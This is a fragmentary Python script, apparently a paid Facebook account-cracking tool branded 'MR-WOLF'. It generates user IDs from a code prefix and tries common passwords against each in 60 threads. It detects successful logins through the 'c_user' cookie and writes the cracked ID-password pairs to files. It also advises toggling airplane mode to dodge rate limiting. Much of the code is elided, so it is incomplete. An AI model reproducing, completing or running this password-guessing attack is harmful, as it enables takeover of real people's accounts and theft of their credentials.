...
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝      
--------------------------------------------------
[•] AUTHOR     : \033[1;32mVH Serice\033[1;37m
[•] STATUS     : \033[1;32m25$\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 2.0 
--------------------------------------------------"""

print('\33[1;37mUSE\033[1;32mAIRPLANE\033[1;37mMODE FOR OK IDZ ')
...
try:
    ...
    proxy = requests.get('https://github.com/mrwolf-danger/all-update/blob/main/cp-update.txt').text.splitlines()
    v = 3.1
...
def wolf_boy():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mWOLF-BOY')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'wolf123','khan1122','wolf786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : khan12345,bangladish,baloch,123456,123456789,etc')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[WOLF-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('WOLF-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR-WOLF\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
